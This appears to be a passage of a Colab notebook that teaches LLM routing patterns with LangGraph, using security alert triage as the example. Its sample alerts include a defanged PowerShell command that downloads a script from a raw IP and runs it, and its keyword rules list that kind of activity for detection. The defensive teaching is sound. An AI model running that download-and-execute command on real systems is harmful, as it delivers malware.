            "style": "IPY_MODEL_150485ab371941f99d517d63fdc03205",
            "value": "config.json: 100%"
          }
        },
        "efb08c7684024bb689645cd687e05285": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_06af1b2f61df42b8a3294a7c460feccd",
            "max": 190,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_2318f363013744229044e99a78d6c619",
            "value": 190
          }
        },
        "7aafff94bcc24b86b1b59e94334e0c36": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_1ca07ace98514c8988777747c36afcda",
            "placeholder": "​",
            "style": "IPY_MODEL_03d0175b795448e8b65cecde6cb6d240",
            "value": " 190/190 [00:00&lt;00:00, 17.4kB/s]"
          }
        },
        "d2fea3348c6b44018f1f2492d2cbdcfd": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "dc4f20d2da37465ab895f96d7332c364": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "150485ab371941f99d517d63fdc03205": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "06af1b2f61df42b8a3294a7c460feccd": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2318f363013744229044e99a78d6c619": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "1ca07ace98514c8988777747c36afcda": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "03d0175b795448e8b65cecde6cb6d240": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        }
      }
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Dimildizio/DS_course/blob/main/Agents/Agentic_patterns/Routing_pattern.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Routing Pattern\n",
        "\n",
        "**Core AI pattern:** chooses the right path (prompt, tool, model, or chain) for each input.\n",
        "\n",
        "Boosts accuracy, lowers cost/latency, and keeps outputs consistent by **sending different problems to different specialists**.\n",
        "\n",
        "Essential for agents that must decide what to do next before doing it.\n",
        "\n",
        "Building block for tool-use, multi-expert systems, and safe fallbacks."
      ],
      "metadata": {
        "id": "HYRjFKph4V99"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Theory"
      ],
      "metadata": {
        "id": "P_FxUTv_4jGq"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### What is it?\n",
        "\n",
        "A **router** inspects an input and **dispatches** it **to** the best **handler**:\n",
        "\n",
        "- Different prompts (e.g., “SQL Expert” vs “Email Writer”)\n",
        "\n",
        "- Different tools (calculator, web search, vector DB)\n",
        "\n",
        "- Different models (small/cheap vs large/accurate)\n",
        "\n",
        "- Different sub-chains (RAG flow vs generation-only, etc)\n",
        "\n",
        "The router can be **rule-based, ML/embedding-based, LLM-as-classifier, or hybrid.**"
      ],
      "metadata": {
        "id": "FfmWFEO748NM"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Why It Matters?\n",
        "\n",
        "**One-size-fits-all prompts** waste tokens and **underperform** because:\n",
        "\n",
        "- Tasks have heterogeneous structure and constraints.\n",
        "\n",
        "- Some cases need tools, others don't.\n",
        "\n",
        "- Many inputs are easy (use small model), some are hard (escalate).\n",
        "\n",
        "- Safety/compliance may require blocking or escalation.\n",
        "\n",
        "\n",
        "#### Routing improves:\n",
        "\n",
        "- Accuracy: expert prompts beat generic ones.\n",
        "\n",
        "- Cost/Latency: cheap paths for easy cases; heavy paths only when needed.\n",
        "\n",
        "- Safety: detect disallowed/PII-sensitive inputs and abstain or handoff."
      ],
      "metadata": {
        "id": "jya-a87A5QIb"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Key Components\n",
        "\n",
        "**Classifier / Gating**\n",
        "\n",
        "- Rules: regex/keywords, heuristics, schema checks.\n",
        "- Embeddings/ML: nearest-neighbor to labeled routes, lightweight classifiers.\n",
        "- LLM-as-Router: single JSON decision (route, confidence, rationale).\n",
        "- Hybrid: rules first (fast/safe), then LLM when uncertain.\n",
        "\n",
        "**Targets (Experts)**\n",
        "\n",
        "- Prompts, tools, models, or full chains with clear contracts (input/output schema).\n",
        "\n",
        "**Unification Layer**\n",
        "\n",
        "- Normalize outputs across branches (e.g., a common JSON envelope) so downstream code stays simple.\n",
        "\n",
        "**Confidence & Fallbacks**\n",
        "\n",
        "- Thresholds, tie-breakers, \"unknown/abstain,\" human-in-the-loop, or a generalist path.\n",
        "\n",
        "**Observability**\n",
        "\n",
        "- Route logs, confusion matrix, coverage/precision, cost & latency per route.\n",
        "\n",
        "**Policy & Safety**\n",
        "\n",
        "- Guardrails pre- and post-route (blocklists, PII detection, content policies)."
      ],
      "metadata": {
        "id": "ofuiD9845yI3"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Practical Use Cases\n",
        "\n",
        "- Customer support triage: billing vs tech vs account -> distinct prompts/RAG corpora.\n",
        "- Code assistant: detect language (Py/JS/SQL) -> language-specific prompts & unit-testers.\n",
        "- Doc extraction: detect doc type (invoice, receipt, ID) -> specialized parsers/schemata as tool.\n",
        "- RAG index selection: pick the right knowledge base or retriever per query.\n",
        "- Tool choice (I'd say most obvious): math -> calculator; current events -> web; entity lookup -> DB.\n",
        "- Multilingual: route by language to locale-tuned prompts/models.\n",
        "- Security: alert/IOC triage -> malware vs phishing vs misconfig paths; escalate unknowns."
      ],
      "metadata": {
        "id": "cYZupEgJ6VWT"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Tricks, pieces of advice and things to consider\n",
        "\n",
        "**Design choice**: Rules vs ML/embeddings vs LLM-as-router\n",
        "\n",
        "- Rules (regex/heuristics): Fast, cheap, transparent.\n",
        "- ML / Embeddings classifier: Train a lightweight model (or use nearest-neighbor on embeddings) to map inputs -> routes.\n",
        "- LLM-as-router: Ask an LLM to return `{route: \"...\", confidence: 0–1, rationale: \"...\"}`, however in practice LLM would likely return 0.3 for not sure, 0.9 for high confidence so it really feels binary\n",
        "- Hybrid (in practice wins in most cases): Rules first (block obvious, fast wins) -> embeddings/ML if uncertain -> LLM only when confidence is low or case is novel.\n",
        "\n",
        "**Contract**: Keep branch outputs schema-aligned.\n",
        "\n",
        "- What: Every branch should return the same envelope so downstream code doesn’t care which path ran.\n",
        "- Why: Simplifies integration, logging, and evaluation.\n",
        "- How: Validate with Pydantic (or Marshmallow) and reject/repair non-conforming outputs.\n",
        "\n",
        "\n",
        "**Safety**: Always include block/abstain and human handoff. The router must be able to say \"don't answer\" and escalate.\n",
        "\n",
        "- Blocklist / policy gates (pre-route): `disallowed content -> {route:\"blocked\", reason:\"pii_detected\"}`.\n",
        "- Abstain on low-confidence: If `confidence < threshold -> {route:\"abstain\"}` and trigger fallback (generalist model) or human triage.\n",
        "- Post-route checks: Scan generated outputs (hallucination detector, SQL safety linter). If fails -> auto-revise or escalate.\n",
        "- Metadata to keep: `reason`, `policy_category`, `recommended_action: \"escalate|revise|drop\"`.\n",
        "-Obviously do not forget to escalate and return.\n",
        "For example:\n",
        "```\n",
        "{ \"route\":\"abstain\", \"confidence\":0.42, \"reason\":\"ambiguous intent\", \"handoff\":\"human_security_analyst\" }\n",
        "```\n",
        "\n",
        "**Ops**: Track route quality and adjust thresholds, cache easy decisions.\n",
        "\n",
        "Treat routing like a model-measure and tune it.\n",
        "\n",
        "- Metrics to log\n",
        "\n",
        "  - Coverage per route (% of traffic).\n",
        "  - Accuracy/Success per route (task-specific score).\n",
        "  - Confusion matrix (where the router picked A but ground truth was B).\n",
        "  - Latency & cost per route.\n",
        "  - Abstain rate and escalation outcomes.\n",
        "\n",
        "- Threshold tuning\n",
        "\n",
        "  - Pick confidence threshold per route to maximize a cost-aware objective. (Might be tricky to choose how).\n",
        "\n",
        "- Caching\n",
        "\n",
        "  - ALWAYS take into account KV-cache since depending on context window it could eat way more vRAM than the model itself. Use KV budgets, eviction tiers, and route-aware policies to keep VRAM stable. Alternatives to KV-cache - prefix KV cache (bounded), response cache (exact matches), retrieval/embedding cache (to reduce prompt length next time).\n",
        "  - Cache final answers and shared prefixes, not full user contexts.\n",
        "  - Normalize input -> compute a routing key (for example hash of lemmatized text).\n",
        "  - If seen before with high confidence, reuse route (and even final answer if safe).\n",
        "  - Great for FAQs and repeated queries -> slashes latency/cost.\n",
        "\n"
      ],
      "metadata": {
        "id": "28nHEt2-7LDV"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## TL;DR\n",
        "\n",
        "**What**: A decision layer that routes inputs to the best expert path.\n",
        "\n",
        "**Why**: Higher accuracy with lower cost/latency and better safety.\n",
        "\n",
        "**Rule of Thumb**: Use routing when tasks are heterogeneous, tools/models differ by case, or you need abstain/escalation behavior."
      ],
      "metadata": {
        "id": "ijLt7ury6xO6"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Practice"
      ],
      "metadata": {
        "id": "upixbTSBQUwx"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Set up"
      ],
      "metadata": {
        "id": "GgV_CPHDRNJ7"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install -q langgraph"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "K7m25q415HRr",
        "outputId": "fdffd90d-7de5-4a33-b36c-e8f52c2ea7fa"
      },
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m43.7/43.7 kB\u001b[0m \u001b[31m2.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m153.3/153.3 kB\u001b[0m \u001b[31m10.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m43.9/43.9 kB\u001b[0m \u001b[31m3.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m56.1/56.1 kB\u001b[0m \u001b[31m4.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m216.7/216.7 kB\u001b[0m \u001b[31m14.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "import json\n",
        "import re\n",
        "import requests\n",
        "import time\n",
        "import math\n",
        "import hashlib\n",
        "import string\n",
        "import requests\n",
        "import numpy as np\n",
        "\n",
        "from typing import TypedDict, Optional\n",
        "\n",
        "from google.colab import userdata\n",
        "from langgraph.graph import StateGraph, END\n",
        "from pydantic import BaseModel, Field\n",
        "from sentence_transformers import SentenceTransformer\n",
        "from sklearn.metrics.pairwise import cosine_similarity\n",
        "\n",
        "\n",
        "OPENROUTER_API_KEY = userdata.get('openrouter')\n",
        "\n",
        "BASE_URL = \"https://openrouter.ai/api/v1/chat/completions\"\n",
        "HEADERS = {\"Authorization\": f\"Bearer {OPENROUTER_API_KEY}\"}\n",
        "\n",
        "MODEL_ROUTER = \"qwen/qwen3-30b-a3b:free\"\n",
        "MODEL_ROUTER_2 = \"nvidia/nemotron-nano-9b-v2:free\"\n",
        "MODEL_EXPERT = \"mistralai/mistral-small-3.2-24b-instruct:free\"\n"
      ],
      "metadata": {
        "id": "71Ya-52cQXov"
      },
      "execution_count": 4,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Dataset example"
      ],
      "metadata": {
        "id": "vN9ww89WRWsw"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "TEST_ALERTS = [\n",
        "  (\"phishing\", \"\"\"User reports email urging immediate password reset. Link goes to login-acme-security[.]com, DKIM fails. Message requests MFA backup codes.\"\"\"),\n",
        "  (\"malware\", \"\"\"EDR flagged PowerShell: iwr hxxp://185.203.116.44/upd.ps1 -o C:\\\\Users\\\\Public\\\\upd.ps1; start-process. File hash 9f2c...e12. Beacon-like 60s jitter.\"\"\"),\n",
        "  (\"misconfig\", \"\"\"CloudTrail shows s3://acme-data set to public-read. No IOCs; finding is CIS-3.1 noncompliance.\"\"\"),\n",
        "  (\"blocked\", \"\"\"Email contains full card: 4111-1111-1111-1111 exp 12/27. Requesting storage in helpdesk ticket.\"\"\"),\n",
        "  (\"unknown\", \"\"\"Potential lateral movement from srv-db-03 to srv-erp-02. Insufficient details to classify.\"\"\")]\n"
      ],
      "metadata": {
        "id": "ALoDoRXORbK6"
      },
      "execution_count": 5,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Call func"
      ],
      "metadata": {
        "id": "yI_4pgKtRRYB"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def call(model, messages, **kw):\n",
        "    payload = {\"model\": model, \"messages\": messages, **kw}\n",
        "    r = requests.post(BASE_URL, headers=HEADERS, json=payload, timeout=20)\n",
        "    r.raise_for_status()\n",
        "    return r.json()[\"choices\"][0][\"message\"][\"content\"]"
      ],
      "metadata": {
        "id": "OdcvBOgSRDVo"
      },
      "execution_count": 6,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Unified Envelope\n",
        "\n",
        "\n",
        "No matter which branch the router takes (phishing, malware, misconfig, blocked, abstain), the output has the same structure.\n",
        "\n",
        "\n",
        "Fields:\n",
        "\n",
        "> route – which path was chosen.\n",
        "\n",
        "> answer – the expert’s text output.\n",
        "\n",
        "> data – extra structured information (e.g. list of IOCs).\n",
        "\n",
        "> citations – sources or references.\n",
        "\n",
        "> confidence – how sure we are.\n",
        "\n",
        "> extras – additional metadata (reason, handoff, etc).\n",
        "\n",
        "> error – error messages if something went wrong.\n",
        "\n",
        "> schema_version – versioning for compatibility."
      ],
      "metadata": {
        "id": "JDkqbF5qvEBz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Envelope(BaseModel):\n",
        "    route: str\n",
        "    answer: str\n",
        "    data: dict = Field(default_factory=dict)\n",
        "    citations: list[str] = Field(default_factory=list)\n",
        "    confidence: float = 0.0\n",
        "    extras: dict = Field(default_factory=dict)\n",
        "    error: str | None = None\n",
        "    schema_version: str = \"1.0\"\n"
      ],
      "metadata": {
        "id": "Nej9-98f4j5C"
      },
      "execution_count": 8,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### LAB 1: Heuristic Rules Router as a Graph Node\n",
        "\n",
        "First layer of Routing\n",
        "\n",
        "**Skill**: Rules/regex gating + building LangGraph node and edge.\n",
        "\n",
        "**Goal**: Classify alerts with simple heuristics and return (route, confidence, reason).\n",
        "\n",
        "#### **Task**\n",
        "\n",
        "- Implement rules_router(alert_text).\n",
        "- Build a minimal LangGraph with a single node rules_node and a terminal.\n",
        "- Run the graph on TEST_ALERTS and note misroutes/abstains.\n",
        "\n",
        "\n",
        "#### **Explanation**\n",
        "\n",
        "- We put a pre-route safety gate into rules to block PII right away (fast & safe).\n",
        "- Routing is like airport security: simple metal detectors first, then more advanced scans if needed.\n",
        "- We return a structured decision to keep later steps consistent.\n",
        "- A single-node graph is trivial, but forces you into explicit control flow, which will pay off as we add branches.\n",
        "\n",
        "\n",
        "#### **Whats and Why's**\n",
        "\n",
        "- Define possible routes -> phishing, malware, misconfig, abstain (not sure), blocked (policy violation).\n",
        "\n",
        "- Write basic rules (regex + keywords) -> if we see signs of credit card numbers -> block, if we see \"reset password\" -> phishing; if \"powershell\" → malware; if \"public-read\" -> misconfig.\n",
        "\n",
        "- Build a routing node in a LangGraph -> this wraps the rules into a reusable step in a graph of decisions.\n",
        "\n",
        "Heuristics would be a first Layer in **Hybrid Router**\n",
        "- Rules catch the obvious 60-70% of cases, and we only escalate the tricky ones."
      ],
      "metadata": {
        "id": "j0IkAKw343Iq"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Define RouteState\n",
        "\n",
        "A StateGraph is a directed graph where each node is a function that takes some state (a Python dict/TypedDict) and returns updated state. Basically carry the alert and the routing decision.\n",
        "\n",
        "Here, RouteState defines what fields we track (text, decision).\n",
        "\n"
      ],
      "metadata": {
        "id": "M_1Uy97K79hb"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class RouteState(TypedDict):\n",
        "    text: str\n",
        "    decision: Optional[dict]"
      ],
      "metadata": {
        "id": "buXbr-wl7vNp"
      },
      "execution_count": 9,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Define rules"
      ],
      "metadata": {
        "id": "whXbG3HJ8EIl"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "ROUTES = [\"phishing\",\"malware\",\"misconfig\",\"abstain\",\"blocked\"]\n",
        "\n",
        "\n",
        "def rules_node(state: RouteState):\n",
        "    return {\"decision\": rules_router(state[\"text\"])}\n",
        "\n",
        "\n",
        "def rules_router(text: str): # very basic router rules\n",
        "    t = text.lower()\n",
        "    # Pre-route blocklist (crude CC number)\n",
        "    if re.search(r\"\\b(?:\\d[ -]*?){13,16}\\b\", t):\n",
        "        return {\"route\":\"blocked\",\"confidence\":0.99,\"reason\":\"pii_detected:card\"}\n",
        "    # Phishing\n",
        "    if any(k in t for k in [\"dkim fails\",\"reset password\",\"mfa backup codes\"]) or \"login-\" in t:\n",
        "        return {\"route\":\"phishing\",\"confidence\":0.8,\"reason\":\"email_auth_signals\"}\n",
        "    # Malware\n",
        "    if any(k in t for k in [\"powershell\",\"beacon\",\"hxxp://\",\"upd.ps1\",\"hash \"]):\n",
        "        return {\"route\":\"malware\",\"confidence\":0.8,\"reason\":\"edr_iocs\"}\n",
        "    # Misconfig\n",
        "    if any(k in t for k in [\"public-read\",\"cis-\",\"0.0.0.0/0\",\"open bucket\",\"exposed s3\"]):\n",
        "        return {\"route\":\"misconfig\",\"confidence\":0.75,\"reason\":\"cloud_misconfig\"}\n",
        "    return {\"route\":\"abstain\",\"confidence\":0.4,\"reason\":\"insufficient_rules\"}\n"
      ],
      "metadata": {
        "id": "RqFzZbXk43dL"
      },
      "execution_count": 10,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Flow"
      ],
      "metadata": {
        "id": "bMxzdIgeLmuP"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "```scss\n",
        "   (Entry)\n",
        "     │\n",
        "     ▼\n",
        " [ rules_node ]  --decision-->  END\n",
        "\n",
        "```"
      ],
      "metadata": {
        "id": "Ih2JNBHVLjiB"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### LangGraph recap\n",
        "\n",
        "**Node**\n",
        "\n",
        "A `node` is a function wrapped into the graph.\n",
        "\n",
        "In `rules_node` defined above when the graph hits the `rules` node, it executes `rules_node` and *updates the state* with a new decision.\n",
        "\n",
        "**Entry point**\n",
        "\n",
        "Is where the graph starts when we run it.\n",
        "\n",
        "Every run starts by going through the `rules` node (that execute `rules_node`).\n",
        "\n",
        "**Edges**\n",
        "\n",
        "Edge connects two nodes: after rules, go to `END`.\n",
        "\n",
        "`END` is a special built-in that tells to stop and return the final state.\n",
        "\n",
        "So in this first graph below here, it's a straight pipeline: `start → rules → END.`\n",
        "\n",
        "**Invoking**\n",
        "\n",
        "`g.compile()` below turns the graph definition into an executable object (*app1*).\n",
        "\n",
        "`.invoke(state)` runs the graph with an initial state.\n",
        "\n",
        "The graph will:\n",
        "\n",
        "1. Start at the entry point (rules)\n",
        "2. Run the node function (rules_node)\n",
        "3. Follow the edges/conditionals (in further labs) until it reaches END\n",
        "4. Return the final state dictionary\n",
        "\n",
        "\n",
        "Eventhough we use `.invoke` in several other libraries to call ML/LLM models, here `.invoke` is not necessary a call to LLM, it **just runs the workflow.**\n",
        "\n",
        "*WHAT* it calls *depends on what's inside the nodes*."
      ],
      "metadata": {
        "id": "PgrBDDOwH6z3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "g = StateGraph(RouteState)\n",
        "g.add_node(\"rules\", rules_node)\n",
        "g.set_entry_point(\"rules\")\n",
        "g.add_edge(\"rules\", END)\n",
        "app1 = g.compile()"
      ],
      "metadata": {
        "id": "X6F8vjau7otO"
      },
      "execution_count": 11,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# Don't forget - no llm included yet, only heuristics\n",
        "for label, text in TEST_ALERTS:\n",
        "    out = app1.invoke({\"text\": text, \"decision\": None})\n",
        "    print(label, \"->\", out[\"decision\"])"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "t3x0Btk-8OFt",
        "outputId": "42da4a74-3fcd-46d0-9ca3-0c41d8329be7"
      },
      "execution_count": 12,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "phishing -> {'route': 'phishing', 'confidence': 0.8, 'reason': 'email_auth_signals'}\n",
            "malware -> {'route': 'malware', 'confidence': 0.8, 'reason': 'edr_iocs'}\n",
            "misconfig -> {'route': 'misconfig', 'confidence': 0.75, 'reason': 'cloud_misconfig'}\n",
            "blocked -> {'route': 'blocked', 'confidence': 0.99, 'reason': 'pii_detected:card'}\n",
            "unknown -> {'route': 'abstain', 'confidence': 0.4, 'reason': 'insufficient_rules'}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Lab 2: Embedding Router\n",
        "\n",
        "We use cos similarity of embeddings (vector representation of infromation) **ML gating** to handle the cases rules can't catch, while still keeping things efficient and controlled."
      ],
      "metadata": {
        "id": "_uvLR8ZN-0mm"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "**Skill**: ML/embeddings gating when rules abstain.\n",
        "\n",
        "**Goal**: Add an embed node that runs only if rules return abstain.\n",
        "\n",
        "#### **Task**\n",
        "\n",
        "- Create embed_router(text) using sentence-transformers + cosine NN.\n",
        "\n",
        "- Extend the graph: rules -> (abstain?) -> embed -> END.\n",
        "\n",
        "- Tune a **threshold**, log which alerts were saved by embeddings.\n",
        "\n",
        "#### **Explanation**\n",
        "\n",
        "- Embeddings catch semantic matches rules miss, improving coverage with low cost.\n",
        "\n",
        "- Threshold here just an adjustable parameter to change the system's behavior. Too low - more `FP` results, too high - more `FN`.\n",
        "\n",
        "- The decision pipeline approaches `Rules → (if abstain) → Embeddings → (if abstain) → LLM`\n"
      ],
      "metadata": {
        "id": "sbSnUc7RC82P"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Whats and why's**\n",
        "We've built a rules router: simple regex and keyword checks, as a disadvantage we got that if the text doesn't match these rules, the system just says `abstain`.\n",
        "\n",
        "Since we take SOC work as our case example, alerts often come in with varied wording. A phishing email might say `update credentials` instead of `reset password` and I cannot even caout the number of `Verify you are not a robot` variants of fake Cloudflare checkbox I've encountered.\n",
        "\n",
        "So here we add embeddings. You could have worked with them in preprocessing text before feeding to the input layer of LLM, using in RAG for vector DB or generally in NLP tasks and may other. Think of them as vector fingerprints of text: semantically similar phrases land close together in space, basically its clusterization. With embeddings + nearest-neighbor, our router can catch these meaning-level matches.\n",
        "\n",
        "**What are we doing here?**\n",
        "\n",
        "- We define **exemplars**: short example alerts for each category (phishing, malware, misconfig).\n",
        "\n",
        "- We encode them and the new alert with a sentence transformer.\n",
        "- We measure embedding using **cosine similarity** to see which exemplar is closest.\n",
